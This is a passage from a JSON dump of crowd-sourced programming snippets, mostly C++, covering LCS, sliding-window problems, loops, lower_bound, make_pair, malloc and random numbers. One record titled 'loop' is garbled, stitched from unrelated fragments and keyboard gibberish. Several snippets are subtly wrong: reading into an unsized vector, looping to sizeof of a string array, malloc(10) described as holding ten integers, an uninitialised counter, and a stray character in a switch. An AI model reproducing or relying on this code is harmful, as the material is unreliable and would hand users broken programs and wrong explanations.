    "description": "class Solution:     def longestCommonSubsequence(self, text1: str, text2: str) -> int:         \"\"\"         text1: horizontally         text2: vertically         \"\"\"         dp = [[0 for _ in range(len(text1)+1)] for _ in range(len(text2)+1)]                  for row in range(1, len(text2)+1):             for col in range(1, len(text1)+1):                 if text2[row-1]==text1[col-1]:                     dp[row][col] = 1+ dp[row-1][col-1]                 else:                     dp[row][col] = max(dp[row-1][col], dp[row][col-1])         return dp[len(text2)][len(text1)]\n#include<bits/stdc++.h> using namespace std;  const int MAX = 1001;  int dp[MAX][MAX]; bool visited[MAX][MAX]; int x, y; string s1, s2;  int lcs(int i, int j) {     if(i == x || j == y)         return 0;      if(visited[i][j])         return dp[i][j];      visited[i][j] = true;     int ans = 0;     if(s1[i] == s2[j])     {         ans = max(ans, 1+lcs(i+1, j+1));     }     else     {         ans = max(ans, lcs(i+1, j));         ans = max(ans, lcs(i, j+1));     }      dp[i][j] = ans;     return ans; }  int main() {     cin >> x >> y;     cin >> s1 >> s2;      for(int i=0; i<=x; i++)     {         for(int j=0; j<=y; j++)         {             visited[i][j] = false;         }     }      cout << lcs(0, 0);     return 0; } \nint maxSubsequenceSubstring(char x[], char y[],                              int n, int m)  {      int dp[MAX][MAX];         // Initialize the dp[][] to 0.      for (int i = 0; i <= m; i++)          for (int j = 0; j <= n; j++)              dp[i][j] = 0;         // Calculating value for each element.      for (int i = 1; i <= m; i++) {          for (int j = 1; j <= n; j++) {                 // If alphabet of string X and Y are              // equal make dp[i][j] = 1 + dp[i-1][j-1]              if (x[j - 1] == y[i - 1])                  dp[i][j] = 1 + dp[i - 1][j - 1];                 // Else copy the previous value in the              // row i.e dp[i-1][j-1]              else                 dp[i][j] = dp[i][j - 1];          }      }         // Finding the maximum length.      int ans = 0;      for (int i = 1; i <= m; i++)          ans = max(ans, dp[i][n]);         return ans;  } \n",
    "reg_date": "2021-10-12T11:41:59.000Z"
  },
  {
    "id": 2987,
    "keyword": null,
    "link": null,
    "title": " longest substring with k unique characters",
    "description": "//I will encourage to first understand the problem then implement it on your know and do not just copy paste this code :) Regards #include <bits/stdc++.h>  using namespace std;  int main() {     string str;     cout<<\"Enter the string :\"<<endl;     cin>>str;     int k;     cout<<\"Enter the number of unique characters required:\"<<endl;     cin>>k;     map<char,int>mp;     int j=0;     int i=0;     int mx=INT_MIN;     int l=str.size();     while(j<l)     {         mp[str[j]]++;         if(int(mp.size())<k)         {             j++;         }         else if(int(mp.size())==k)         {             mx=max(mx,j-i+1);             j++;         }         else         {             while(int(mp.size())>k)             {                 mp[str[i]]--;                 if(mp[str[i]]==0)                 {                     mp.erase(str[i]);                 }                 i++;             }             j++;         }     }   cout<<mx<<endl;      return 0; } \n",
    "reg_date": "2021-10-12T11:41:59.000Z"
  },
  {
    "id": 2988,
    "keyword": null,
    "link": null,
    "title": " longest substring without repeating characters",
    "description": "#include <bits/stdc++.h>  using namespace std;  int main() {     string s;     cin>>s;     int l=s.length();     map<char,int>mp;     int mx=INT_MIN;     int i=0;     int j=0;     while(j<l)     {         mp[s[j]]++;         if(int(mp.size())<j-i+1)         {           while(int(mp.size())<j-i+1)           {               mp.erase(s[i]);               i++;           }           j++;         }         else if(int(mp.size())==j-i+1)         {             mx=max(mx,j-i+1);             j++;         }     }     cout<<mx;     return 0; } \n",
    "reg_date": "2021-10-12T11:41:59.000Z"
  },
  {
    "id": 2989,
    "keyword": null,
    "link": null,
    "title": " loop",
    "description": ">>> fruits = ['orange', 'apple', 'pear', 'banana', 'kiwi', 'apple', 'banana'] >>> fruits.count('apple') 2 >>> fruits.count('tangerine') 0 >>> fruits.index('banana') 3 >>> fruits.index('banana', 4)  # Find next banana starting a position 4 6 >>> fruits.reverse() >>> fruits ['banana', 'apple', 'kiwi', 'banana', 'pear', 'apple', 'orange'] >>> fruits.append('grape') >>> fruits ['banana', 'apple', 'kiwi', 'banana', 'pear', 'apple', 'orange', 'grape'] >>> fruits.sort() >>> fruits ['apple', 'apple', 'banana', 'banana', 'grape', 'kiwi', 'orange', 'pear'] >>> fruits.pop() 'pear' \nivDCugkzcgyuxzhjchxhczcvbcbbcbv DsdSDFdfdSF DFSFSD CHGGhhskfiv \tedfgzhbvbcd   fsdf \n 1.0.0 \nmamba install -c conda-forge notebook \n1234567891011121314151617181920import datetime  def parse_expenses(expenses_string):     \"\"\"Parse the list of expenses and return the list of triples (date, value, currency).     Ignore lin\n3 XOX XXO O_O XXX OOO ___ XOX OX_ XOX \nLevel 2 DFD 1.0\nuse App\\Http\\Middleware\\EnsureTokenIsValid;  Route::middleware([EnsureTokenIsValid::class])->group(function () {     Route::get('/', function () {         //     });      Route::get('/profile', function () {         //     })->withoutMiddleware([EnsureTokenIsValid::class]); });\nvar ctx = canvas.getContext('2d'),     img = new Image;  img.onload = draw; img.src = \"http://i.stack.imgur.com/UFBxY.png\"; img.src = \"http://i.stack.imgur.com/UFBxY.png\";  function draw() {    var dArr = [-1,-1, 0,-1, 1,-1, -1,0, 1,0, -1,1, 0,1, 1,1], // offset array       s = 2,  // thickness scale       i = 0,  // iterator       x = 5,  // final position       y = 5;      // draw images at offsets from the array scaled by s   for(; i < dArr.length; i += 2)     ctx.drawImage(img, x + dArr[i]*s, y + dArr[i+1]*s);      // fill with color   ctx.globalCompositeOperation = \"source-in\";   ctx.fillStyle = \"red\";   ctx.fillRect(0,0,canvas.width, canvas.height);      // draw original image in normal mode   ctx.globalCompositeOperation = \"source-over\";   ctx.drawImage(img, x, y); }\n 0.1.0 \n",
    "reg_date": "2021-10-12T11:41:59.000Z"
  },
  {
    "id": 2990,
    "keyword": null,
    "link": null,
    "title": " loop in c++",
    "description": "//'i' can be any number //Can be any comparison operater  //can be any number compared //can be any mathmatic operater  for (int i = 0; i<100; i++){ //Do thing }  //more info on operaters //https://www.w3schools.com/cpp/cpp_operators.asp\n#include <iostream> using namespace std;  int main() { \tfor (int i = 0; i < 20; i++)     { \t\tcout << i << endl;     }   \t//prints the number (i) }\nfor(int i=0; i<=limit; i++) { \t//statement }\n   for (int i = 0; i < 10; i++){   //Do something as long as i is less than 10,    //In that case it will loop 10 times   //use break; to restart the loop whenever you want to cancel the loops.   cout << i;      //at the end, remember i will be increased by 1. }  //output 0123456789\nfor(int i=0;i<size;i++){}\nout << size;\n",
    "reg_date": "2021-10-12T11:41:59.000Z"
  },
  {
    "id": 2991,
    "keyword": null,
    "link": null,
    "title": " loop over multidimensional array c++",
    "description": "int arr[2][3] = {   {1,2,3},    {4,5,6} }; for(int i=0 ; i<sizeof(arr) / sizeof(arr[0]) ; i++){ \tfor(int j=0 ; j<sizeof(arr[i])/sizeof(arr[i][0]) ; j++){ \t\tcout<<\"2D array have: \"<< arr[i][j]<<endl; \t} }\n",
    "reg_date": "2021-10-12T11:41:59.000Z"
  },
  {
    "id": 2992,
    "keyword": null,
    "link": null,
    "title": " loop through array c++",
    "description": "string texts[] = {\"Apple\", \"Banana\", \"Orange\"}; for( unsigned int a = 0; a < sizeof(texts); a = a + 1 ) {     cout << \"value of a: \" << texts[a] << endl; }\nfor (int i = 0; i < arr.size(); ++i){ //use if we explicitly need the value of i cout << i << \":\\t\" << arr[i] << endl; } for (int element : arr){ //modifying element will not affect the array cout << element << endl; } for (int &element : arr){ //modifying element will affect the array cout << element << endl; }\n#include <iostream> #include <array>  int main() { \tint aNumbers[] = { 0, 1, 2, 3, 4, 5 }; \tint count = 0;\t \t \tfor (int aNumber : aNumbers) \t{\t\t \t\tstd::cout << \"Element \"<< count << \" : \" << aNumber << std::endl; \t\tcount++; \t} }\nfor(int i = 0; i < 4; i++) {   cout << cars[i] << \"\\n\"; }\nint v[] = {1,2,3,4,5}; for (int n : v)   cout << n << endl; //make sure to compile with -std=c++11\n/*sizeof(array_scores) is a pointer to array_scores[],  and has to be divided by each first-object[0]*/ for(int a = 0; a < sizeof(array_scores)/sizeof(array_scores[0]); a = a + 1 ){ \tcout << \"for loop, a = \" << array_scores[a] << \" at position \" << a << \"\\n\"; } //https://stackoverflow.com/questions/20234898/correct-way-of-looping-through-c-arrays\n",
    "reg_date": "2021-10-12T11:41:59.000Z"
  },
  {
    "id": 2993,
    "keyword": null,
    "link": null,
    "title": " loop through char in string c++",
    "description": "std::string s(\"Hello world\");  for (char & c : s) {     std::cout << \"One character: \" << c << \"\\n\";     c = '*'; } \n",
    "reg_date": "2021-10-12T11:41:59.000Z"
  },
  {
    "id": 2994,
    "keyword": null,
    "link": null,
    "title": " loop through set c++",
    "description": "// set::begin/end #include <iostream> #include <set>  int main () {   int myints[] = {75,23,65,42,13};   std::set<int> myset (myints,myints+5);    std::cout << \"myset contains:\";   for (std::set<int>::iterator it=myset.begin(); it!=myset.end(); ++it)     std::cout << ' ' << *it;    std::cout << '\\n';    return 0; }\n//Method 1  // Iterate over all elements of set  // using range based for loop  for (auto& i : mySet)  {     cout << i << \" , \";  }  //Method 2  // Iterate over all elements using for_each  // and lambda function  for_each(mySet.begin(), mySet.end(), [](const auto & str)  {     cout<<str<<\", \";  });  //Method 3  set<string>::iterator it = mySet.begin();  // Iterate till the end of set  while (it != mySet.end())  {     // Print the element     cout << *it << \", \";     //Increment the iterator     it++;  }\n//Method 1  for (auto& i : mySet)  {     cout << i << \" \";  }  //Method 2  for_each(mySet.begin(), mySet.end(), [](const auto & str)  {     cout<<str<<\" \";  });  //Method 3  set<string>::iterator it = mySet.begin();  while (it != mySet.end()) {     cout << *it << \" \";     it++;  } //Method 4  for (set<int>::iterator it=myset.begin(); it!=myset.end(); ++it)     cout <<*it << \" \";\n",
    "reg_date": "2021-10-12T11:41:59.000Z"
  },
  {
    "id": 2995,
    "keyword": null,
    "link": null,
    "title": " lopping over an array c++",
    "description": "for (int i = 0; i < arr.size(); ++i){ //use if we explicitly need the value of i cout << i << \":\\t\" << arr[i] << endl; } for (int element : arr){ //modifying element will not affect the array cout << element << endl; } for (int &element : arr){ //modifying element will affect the array cout << element << endl; }\nfor(int i = 0; i < 4; i++) {   cout << cars[i] << \"\\n\"; }\n",
    "reg_date": "2021-10-12T11:42:00.000Z"
  },
  {
    "id": 2996,
    "keyword": null,
    "link": null,
    "title": " lower bound and upper bound in c++",
    "description": "#include<bits/stdc++.h> using namespace std;  int main(){     int n;cin>>n;     vector<int>v;      for(int i=0;i<n;i++){         cin>>v[i];     }     sort(v.begin(),v.end());       //lower bound for vector     auto pointer1 = lower_bound(v.begin(), v.end(), 7);     cout<<(*pointer1)<<endl;      //lower bound for array;     int array[n];     for(int i=0;i<n;i++){         cin>>array[i];     }     sort(array,array+n);     //lowerbound     int *pointer2 = lower_bound(array, array+n, 7);      //if you want upper bound then just replace lower_bound with upper_bound }\n// lower_bound/upper_bound example #include <iostream>     // std::cout #include <algorithm>    // std::lower_bound, std::upper_bound, std::sort #include <vector>       // std::vector  int main () {   int myints[] = {10,20,30,30,20,10,10,20};   std::vector<int> v(myints,myints+8);           // 10 20 30 30 20 10 10 20    std::sort (v.begin(), v.end());                // 10 10 10 20 20 20 30 30    std::vector<int>::iterator low,up;   low=std::lower_bound (v.begin(), v.end(), 20); //          ^   up= std::upper_bound (v.begin(), v.end(), 20); //                   ^    std::cout << \"lower_bound at position \" << (low- v.begin()) << '\\n';    std::cout << \"upper_bound at position \" << (up - v.begin()) << '\\n';    return 0; }  // Output // lower_bound at position 3 // upper_bound at position 6\n// lower_bound/upper_bound example #include <iostream>     // std::cout #include <algorithm>    // std::lower_bound, std::upper_bound, std::sort #include <vector>       // std::vector  int main () {   int myints[] = {10,20,30,30,20,10,10,20};   std::vector<int> v(myints,myints+8);           // 10 20 30 30 20 10 10 20    std::sort (v.begin(), v.end());                // 10 10 10 20 20 20 30 30    std::vector<int>::iterator low,up;   low=std::lower_bound (v.begin(), v.end(), 20); //          ^   up= std::upper_bound (v.begin(), v.end(), 20); //                   ^    std::cout << \"lower_bound at position \" << (low- v.begin()) << '\\n';   std::cout << \"upper_bound at position \" << (up - v.begin()) << '\\n';    return 0; }\nupper_bound(v.begin(), v.end(), val); Returns an iterator pointing to the first element in the range [first,last) which compares greater than val.\nThe lower_bound() method in C++ is used to return an iterator pointing to the first element in the range [first, last) which has a value not less than val.\n",
    "reg_date": "2021-10-12T11:42:00.000Z"
  },
  {
    "id": 2997,
    "keyword": null,
    "link": null,
    "title": " lower bound c++",
    "description": "// lower_bound/upper_bound example #include <iostream>     // std::cout #include <algorithm>    // std::lower_bound, std::upper_bound, std::sort #include <vector>       // std::vector  int main () {   int myints[] = {10,20,30,30,20,10,10,20};   std::vector<int> v(myints,myints+8);           // 10 20 30 30 20 10 10 20    std::sort (v.begin(), v.end());                // 10 10 10 20 20 20 30 30    std::vector<int>::iterator low,up;   low=std::lower_bound (v.begin(), v.end(), 20); //          ^   up= std::upper_bound (v.begin(), v.end(), 20); //                   ^    std::cout << \"lower_bound at position \" << (low- v.begin()) << '\\n';    std::cout << \"upper_bound at position \" << (up - v.begin()) << '\\n';    return 0; }  // Output // lower_bound at position 3 // upper_bound at position 6\n",
    "reg_date": "2021-10-12T11:42:00.000Z"
  },
  {
    "id": 2998,
    "keyword": null,
    "link": null,
    "title": " lpcwstr to string c++",
    "description": "int main { \tstd::string stringtoconvert;  \tstd::wstring temp = std::wstring(stringtoconvert.begin(), stringtoconvert.end()); \tLPCWSTR lpcwstr = temp.c_str(); }\n",
    "reg_date": "2021-10-12T11:42:00.000Z"
  },
  {
    "id": 2999,
    "keyword": null,
    "link": null,
    "title": " lru cache gfg",
    "description": "List<int>queue,map<int,int>mp\n",
    "reg_date": "2021-10-12T11:42:00.000Z"
  },
  {
    "id": 3000,
    "keyword": null,
    "link": null,
    "title": " lua table contains",
    "description": "local tryingToGet = \"value\" for _,v in pairs(table) do   if v == tryingToGet then     break   end end\n",
    "reg_date": "2021-10-12T11:42:00.000Z"
  },
  {
    "id": 3001,
    "keyword": null,
    "link": null,
    "title": " lucky four codechef",
    "description": "#include <iostream> using namespace std;  int main() { \t// your code goes here \tint t,number,count,rem; \tstd::cin >> t; \t \tfor (int i = 0; i < t; i++) { \t    cin >> number; \t    while(number != 0){ \t        rem = number % 10; \t        if (rem == 4){ \t            count++; \t        } \t        number /= 10; \t    } \t    std::cout << count << std::endl; \t    count = 0; \t} \treturn 0; }\nt=int(input()) a=str(4) for i in range(t):   x=str(input())   count=0   for j in x:     if j==a:       count=count+1    print(count)\n",
    "reg_date": "2021-10-12T11:42:00.000Z"
  },
  {
    "id": 3002,
    "keyword": null,
    "link": null,
    "title": " lunar ckient",
    "description": "Better than badlion good choose\n",
    "reg_date": "2021-10-12T11:42:00.000Z"
  },
  {
    "id": 3003,
    "keyword": null,
    "link": null,
    "title": " lvalue required as left operand of assignment",
    "description": "//You cannot assign something to a numerical constant int num1,num2 if (num1%num2=0) //error //You can't assign value of num1%num2 to 0 //Instead you can check whether (num1%num2) is equal to 0 or not by: if (num1%num2==0) // no error\n/*lvalue means an assignable value (variable), and in assignment the left value to the = has to be lvalue (pretty clear).  Both function results and constants are not assignable (rvalues), so they are rvalues. so the order doesn't matter and if you forget to use == you will get this error. (edit:)I consider it a good practice in comparison to put the constant in the left side, so if you write = instead of ==, you will get a compilation error. for example:*/  int a = 5; if (a = 0) // Always evaluated as false, no error. {     //... } vs.  int a = 5; if (0 = a) // Generates compilation error, you cannot assign a to 0 (rvalue) {     //... }\n",
    "reg_date": "2021-10-12T11:42:01.000Z"
  },
  {
    "id": 3004,
    "keyword": null,
    "link": null,
    "title": " magic spell hackerrank",
    "description": "if (Fireball *fb=dynamic_cast<Fireball*>(spell)) {     fb->revealFirepower(); }  else if (Frostbite *fz=dynamic_cast<Frostbite*>(spell)) {     fz->revealFrostpower(); }  else if (Thunderstorm *ts=dynamic_cast<Thunderstorm*>(spell)) {     ts->revealThunderpower(); }  else if (Waterbolt *wb=dynamic_cast<Waterbolt*>(spell)) {     wb->revealWaterpower(); } else { // generic spell     string spellN = spell->revealScrollName();     string spellJ = SpellJournal::read();     int m=spellN.length();     int n=spellJ.length();     int array[m+1][n+1];       // solve for LCS     for (int i=0;i<=m;i++) array[i][0]=0;     for (int j=0;j<=n;j++) array[0][j]=0;     for (int i=1;i<=m;i++) {         for (int j=1;j<=n;j++) {             if (spellN[i-1] == spellJ[j-1])                 array[i][j]=array[i-1][j-1]+1;             else                 array[i][j]=max(array[i][j-1],array[i-1][j]);         }     }       cout << array[m][n] << endl;  } \n",
    "reg_date": "2021-10-12T11:42:01.000Z"
  },
  {
    "id": 3005,
    "keyword": null,
    "link": null,
    "title": " main bigint",
    "description": "#include <stdexcept> #include\"Bigint.hpp\" #include<algorithm> // CONSTRUCTOR OVERLOAD  Bigint::Bigint(std::list<unsigned char>B)     :m_digits(B){} Bigint::~Bigint(){} //##################################### is_zero #########>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Amir Ammar bool Bigint::is_zero()const {      if(m_digits.front()=='0'){        return true;      }      return false; } //##################################### is_negative ######################################################### bool Bigint::is_negative() const{    if(m_is_negative == true){      return  true ;    }else       return false; } //<<<<<<<<<<<<<<<<<<<<<<<<<<<insertion operator overloading<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< Amir Ammar std::ostream& operator<<(std::ostream& out, const Bigint& i){   for(auto b = i.m_digits.begin(); b != i.m_digits.end(); ++b){     out<<(*b);   }   return (out); } //>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>extraction operator overloading>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Efi Fogel std::istream& operator>>(std::istream& in, Bigint& i) {   char c;   in.get(c);   if (c == '-') i.m_is_negative = true;   else {     if (! std::isdigit(c)) throw std::runtime_error(\"Invalid input\");     i.m_digits.emplace_front(c);   }   while (in.get(c) && (c != 0xa)) {     if (! std::isdigit(c)) throw std::runtime_error(\"Invalid input\");     i.m_digits.emplace_front(c);   }   i.m_digits.reverse(); // additional method to return the reversed value (the real input)   while(i.m_digits.front()=='0'&&i.m_digits.size()!= 1){ // while loop to earse additional zeroes      i.m_digits.pop_front();     if(i.m_digits.size()== 1)       break;   }   return in; }\n#include\"Bigint.hpp\" #include\"Command.hpp\" #include<string> #include<sstream> #include<iostream> int main() {     try     {       Bigint list1 ;       Bigint list2 ;       std::string userinput;       std::cout<<\"Please enter the first integer: \";  // ===>>> Bigint 1        std::cin >> list1;       std::cout<<\"Please enter the second integer: \";  // ===>>> Bigint 2        std::cin >> list2;       std::cout<<\"Please enter the command (0=+, 1=-, 2=*):\\t\";       std::cin>>userinput;       if(userinput[0]<48||userinput[0]>50||userinput.length()>1)throw std::runtime_error(\"invalid input\");       switch(userinput[0]H)           {             case(ADD):              std::cout<<list1+list2<<std::endl;              break;             case(SUB):              std::cout<<list1-list2<<std::endl;              break;             case(MUL):              std::cout<<list1*list2<<std::endl;              break;           }     }catch(std::runtime_error& e){ std::cout<<e.what()<<std::endl;}   return 0; }\n",
    "reg_date": "2021-10-12T11:42:01.000Z"
  },
  {
    "id": 3006,
    "keyword": null,
    "link": null,
    "title": " make a program on voting using c++ of at least 1000 lines",
    "description": "/*  * australian-voting.cpp  */  #include <iostream> #include <string> #include <sstream>  void parse_case(int &candidates_count, int &votes_count, char candidates[][80], int votes[][1000]) {     std::cin >> candidates_count;     std::cin.get();     for (int j=0; j<candidates_count; j++) {         std::cin.getline(candidates[j], sizeof(candidates[j]), '\\n');     }     votes_count = 0;     std::string line;     while (std::getline(std::cin, line)) {         if (line.empty()) {             break;         }         std::stringstream ss(line);         for (int k=0; k<candidates_count; k++) {             ss >> votes[k][votes_count];         }         votes_count++;     } }  void reset_losers(bool losers[20]) {     for (int k=0; k<20; k++) {         losers[k] = false;     } }  void count_votes(int candidates_count, int votes_count, int candidate_votes[20], int votes[][1000]) {     for (int j=0; j<candidates_count; j++) {         candidate_votes[j] = 0;     }     for (int j=0; j<votes_count; j++) {         candidate_votes[(votes[0][j]-1)]++;     } }  int find_winners(int candidates_count, int remaining_candidates_count, int votes_count, int candidate_votes[20], int subroutine_results[20]) {     int max_votes = 0;     int winners_count = 0;      for (int k=0; k<candidates_count; k++) {         if (candidate_votes[k] > max_votes) {             max_votes = candidate_votes[k];             subroutine_results[0] = k;             winners_count = 1;         } else if (candidate_votes[k] == max_votes) {             subroutine_results[(++winners_count-1)] = k;         }     }      if (winners_count == remaining_candidates_count || ( winners_count == 1 && (double) max_votes / votes_count > 0.5 ) ) {         return winners_count;     }      return 0; }  int find_losers(int candidates_count, int votes_count, int candidate_votes[20], int subroutine_results[20], bool losers[20]) {     int min_votes = 1001;     int losers_count = 0;      for (int k=0; k<candidates_count; k++) {         if (!losers[k]) {             if (candidate_votes[k] < min_votes) {                 min_votes = candidate_votes[k];                 subroutine_results[0] = k;                 losers_count = 1;             } else if (candidate_votes[k] == min_votes) {                 subroutine_results[(++losers_count-1)] = k;             }         }     }      for (int i=0; i<losers_count; i++) {         losers[subroutine_results[i]] = true;     }      return losers_count; }  void eliminate_loser(int remaining_candidates_count, int votes_count, int votes[][1000], int loser) {     for (int i = 0; i<remaining_candidates_count; i++) {         for (int j = 0; j<votes_count; j++) {             if (votes[i][j] == loser + 1) {                 for (int l = i; l<remaining_candidates_count; l++) {                     votes[l][j] = votes[l + 1][j];                 }             }         }     } }  int main( int argc, char * argv[] ) {     int cases_count;     int candidates_count;     int remaining_candidates_count;     int votes_count;     char candidates[20][80];     int votes[20][1000];     int candidate_votes[20];     int subroutine_results[20];     bool losers[20];     int winners_count;     int losers_count;      std::cin >> cases_count;     std::cin.get();     std::cin.get();      for (int i=0; i<cases_count; i++) {         parse_case(candidates_count, votes_count, candidates, votes);         reset_losers(losers);         remaining_candidates_count = candidates_count;         winners_count = 0;         while (!winners_count) {             count_votes(candidates_count, votes_count, candidate_votes, votes);             winners_count = find_winners(candidates_count, remaining_candidates_count, votes_count, candidate_votes, subroutine_results);             if (winners_count == 0) {                 losers_count = find_losers(candidates_count, votes_count, candidate_votes, subroutine_results, losers);                 for (int k = 0; k<losers_count; k++) {                     eliminate_loser(remaining_candidates_count, votes_count, votes, subroutine_results[k]);                     remaining_candidates_count--;                 }             }         }         for (int j=0; j<winners_count; j++) {             std::cout << candidates[subroutine_results[j]] << std::endl;         }         std::cout << std::endl;     }      return 0; } \n// init to zero std::vector<int> scores(candidates.size(), 0);  // count 'em all up for (const auto& ranking : rankings) {     if (!ranking.empty()) {         ++scores[ranking.front()];     } }  // find the max element auto it = std::max_element(scores.begin(), scores.end());   // if it's at least half, we have a winner!  if (*it > candidates.size()/2) { ... } \n",
    "reg_date": "2021-10-12T11:42:01.000Z"
  },
  {
    "id": 3007,
    "keyword": null,
    "link": null,
    "title": " make a token",
    "description": "Just go to https://cryptocreate.webflow.io/ and customize your own blockchain and create it. Thank me later\n",
    "reg_date": "2021-10-12T11:42:01.000Z"
  },
  {
    "id": 3008,
    "keyword": null,
    "link": null,
    "title": " make cin cout faster",
    "description": "int main() {     ios_base::sync_with_stdio(false);     cin.tie(NULL);     return 0; }\n",
    "reg_date": "2021-10-12T11:42:01.000Z"
  },
  {
    "id": 3009,
    "keyword": null,
    "link": null,
    "title": " make pair c++",
    "description": "// make_pair example #include <utility>      // std::pair #include <iostream>     // std::cout  int main () {   std::pair <int,int> foo;   std::pair <int,int> bar;    foo = std::make_pair (10,20);   bar = std::make_pair (10.5,'A'); // ok: implicit conversion from pair<double,char>    std::cout << \"foo: \" << foo.first << \", \" << foo.second << '\\n';   std::cout << \"bar: \" << bar.first << \", \" << bar.second << '\\n';    return 0; }\n#include <utility>      // std::pair #include <iostream>     // std::cout  int main () {   std::pair <int,int> foo;   std::pair <int,int> bar;    foo = std::make_pair (10,20);   bar = std::make_pair (10.5,'A'); // ok: implicit conversion from pair<double,char>    std::cout << \"foo: \" << foo.first << \", \" << foo.second << '\\n';   std::cout << \"bar: \" << bar.first << \", \" << bar.second << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:42:01.000Z"
  },
  {
    "id": 3010,
    "keyword": null,
    "link": null,
    "title": " make pair in c++",
    "description": "Pair_name = make_pair (value1,value2); #Abhay Tiwari IITP\n",
    "reg_date": "2021-10-12T11:42:01.000Z"
  },
  {
    "id": 3011,
    "keyword": null,
    "link": null,
    "title": " make pair map",
    "description": "// make_pair example #include <utility>      // std::pair #include <iostream>     // std::cout  int main () {   std::pair <int,int> foo;   std::pair <int,int> bar;    foo = std::make_pair (10,20);   bar = std::make_pair (10.5,'A'); // ok: implicit conversion from pair<double,char>    std::cout << \"foo: \" << foo.first << \", \" << foo.second << '\\n';   std::cout << \"bar: \" << bar.first << \", \" << bar.second << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:42:01.000Z"
  },
  {
    "id": 3012,
    "keyword": null,
    "link": null,
    "title": " make random nuber between two number in c++",
    "description": "#include <stdio.h>      /* NULL */ #include <stdlib.h>     /* srand, rand */ #include <time.h>       /* time */  int Main() {   int randomNumber;    /* initialize random seed: */   srand (time(NULL));    /* generate random number between 1 and 10: */   randomNumber = rand() % 10 + 1; \tv1 = rand() % 100;         // v1 in the range 0 to 99 \tv2 = rand() % 100 + 1;     // v2 in the range 1 to 100 \tv3 = rand() % 30 + 1985;   // v3 in the range 1985-2014  }\n",
    "reg_date": "2021-10-12T11:42:02.000Z"
  },
  {
    "id": 3013,
    "keyword": null,
    "link": null,
    "title": " making random numbers in c++",
    "description": "/* rand example: guess the number */ #include <stdio.h>      /* printf, scanf, puts, NULL */ #include <stdlib.h>     /* srand, rand */ #include <time.h>       /* time */  int main () {   int iSecret, iGuess;    /* initialize random seed: */   srand (time(NULL));    /* generate secret number between 1 and 10: */   iSecret = rand() % 10 + 1;    do {     printf (\"Guess the number (1 to 10): \");     scanf (\"%d\",&iGuess);     if (iSecret<iGuess) puts (\"The secret number is lower\");     else if (iSecret>iGuess) puts (\"The secret number is higher\");   } while (iSecret!=iGuess);    puts (\"Congratulations!\");   return 0; }\n",
    "reg_date": "2021-10-12T11:42:02.000Z"
  },
  {
    "id": 3014,
    "keyword": null,
    "link": null,
    "title": " malloc() in c and c++",
    "description": "/* malloc example: random string generator*/ #include <stdio.h>      /* printf, scanf, NULL */ #include <stdlib.h>     /* malloc, free, rand */  int main () {   int i,n;   char * buffer;    printf (\"How long do you want the string? \");   scanf (\"%d\", &i);    buffer = (char*) malloc (i+1);   if (buffer==NULL) exit (1);    for (n=0; n<i; n++)     buffer[n]=rand()&+'a';   buffer[i]='\\0';    printf (\"Random string: %s\\n\",buffer);   free (buffer);    return 0; }\n",
    "reg_date": "2021-10-12T11:42:02.000Z"
  },
  {
    "id": 3015,
    "keyword": null,
    "link": null,
    "title": " malloc  c++ program",
    "description": "void* malloc(size_t size);\n",
    "reg_date": "2021-10-12T11:42:02.000Z"
  },
  {
    "id": 3016,
    "keyword": null,
    "link": null,
    "title": " malloc c++",
    "description": "#include <iostream> #include <cstdlib> using namespace std;  int main() { \tint *ptr; \tptr = (int*) malloc(5*sizeof(int));  \tif(!ptr) \t{ \t\tcout << \"Memory Allocation Failed\"; \t\texit(1); \t} \tcout << \"Initializing values...\" << endl << endl;  \tfor (int i=0; i<5; i++) \t{ \t\tptr[i] = i*2+1; \t} \tcout << \"Initialized values\" << endl;  \tfor (int i=0; i<5; i++) \t{ \t\t/* ptr[i] and *(ptr+i) can be used interchangeably */ \t\tcout << *(ptr+i) << endl; \t}  \tfree(ptr); \treturn 0; }\n/* malloc example: random string generator*/ #include <stdio.h>      /* printf, scanf, NULL */ #include <stdlib.h>     /* malloc, free, rand */  int main () {   int i,n;   char * buffer;    printf (\"How long do you want the string? \");   scanf (\"%d\", &i);    buffer = (char*) malloc (i+1);   if (buffer==NULL) exit (1);    for (n=0; n<i; n++)     buffer[n]=rand()&+'a';   buffer[i]='\\0';    printf (\"Random string: %s\\n\",buffer);   free (buffer);    return 0; }\nint alloc_size = 10; int* buffer = (int*) malloc (alloc_size); //Allocate memory block which can fit 10 integers \nvoid* malloc(size_t size);\n",
    "reg_date": "2021-10-12T11:42:02.000Z"
  },
  {
    "id": 3017,
    "keyword": null,
    "link": null,
    "title": " malloc c++ example",
    "description": "#include <iostream> #include <cstdlib> using namespace std;  int main() { \tint *ptr; \tptr = (int*) malloc(5*sizeof(int));  \tif(!ptr) \t{ \t\tcout << \"Memory Allocation Failed\"; \t\texit(1); \t} \tcout << \"Initializing values...\" << endl << endl;  \tfor (int i=0; i<5; i++) \t{ \t\tptr[i] = i*2+1; \t} \tcout << \"Initialized values\" << endl;  \tfor (int i=0; i<5; i++) \t{ \t\t/* ptr[i] and *(ptr+i) can be used interchangeably */ \t\tcout << *(ptr+i) << endl; \t}  \tfree(ptr); \treturn 0; }\nint alloc_size = 10; int* buffer = (int*) malloc (alloc_size); //Allocate memory block which can fit 10 integers \nvoid* malloc(size_t size);\n",
    "reg_date": "2021-10-12T11:42:02.000Z"
  },
  {
    "id": 3018,
    "keyword": null,
    "link": null,
    "title": " malloc in c++",
